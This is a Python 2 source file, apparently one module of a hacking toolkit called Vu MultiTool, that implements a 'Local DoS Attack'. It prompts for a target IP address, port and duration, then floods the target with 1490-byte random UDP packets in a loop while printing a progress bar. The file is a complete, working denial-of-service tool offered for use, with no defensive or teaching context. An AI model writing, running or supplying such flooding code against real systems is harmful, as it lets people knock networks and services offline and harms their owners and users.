# Vu MultiTool
# Providing A Plethora of Local Host and Internet Wide Utilites
# Local DoS Attack Module

import sys
import os
import time
import socket
import random
import struct
import threading

def startProgress(title):
    global progress_x
    sys.stdout.write(title + " -> [" + "-"*45 + "]" + chr(8)*46)
    sys.stdout.flush()
    progress_x = 0

def progress(x,y):
    global progress_x
    x = int(x * 45 // y)
    sys.stdout.write("#" * (x - progress_x))
    sys.stdout.flush()
    progress_x = x

def endProgress():
    sys.stdout.write("#" * (45 - progress_x) + "]\n")
    sys.stdout.flush()

def multi_lds_main():
    print("-- -- -- -- -- -- --   Vu MultiTool   -- -- -- -- -- -- --")
    print('-- -- -- -- -- --    Local DoS Attack    -- -- -- -- -- --\n')
    _attackAddress = raw_input("Enter IP Address       ->  ")
    _attackPort    = input("Enter Port             ->  ")
    _attackDurr    = input("Enter Durration (sec)  ->  ")
    _attackDurr = _attackDurr*80000
    print('\n')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    _maxSent = 0
    _sentBytes = 0
    startProgress("ATTACK")
    while 1:
        sock.sendto(bytes, (_attackAddress, _attackPort))
        _maxSent = _maxSent + 1
        if(_maxSent == _attackDurr):
            endProgress()
            print("ATTACK -> [COMPLETED] "+str(_maxSent)+" Total Packets Sent\n")
            break
        else:
            progress(_maxSent, _attackDurr)
            continue

